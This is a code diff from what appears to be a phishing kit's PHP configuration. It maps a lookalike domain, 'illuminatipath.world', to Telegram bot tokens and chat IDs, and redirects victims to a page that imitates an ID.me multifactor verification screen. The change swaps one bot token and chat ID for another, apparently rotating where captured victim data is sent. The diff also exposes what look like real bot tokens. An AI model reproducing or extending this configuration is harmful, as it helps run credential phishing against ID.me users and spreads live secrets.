@@ -63,7 +63,7 @@ $site_map = [
     'illuminatipath.world' => [
         "bots" => [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
-            ['token' => '8573585719:AAH3nsPej6dsiVQke8r2EmVo0Ri8rWz8C1c', 'chat_id' => '7207169369'],
+            ['token' => '8491692614:AAHhTPb4DRwkvmJa0SjF00v5x8kNWA82xfk', 'chat_id' => '6378885812'],
         ],
         "redirect" => "https://illuminatipath.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
     ],
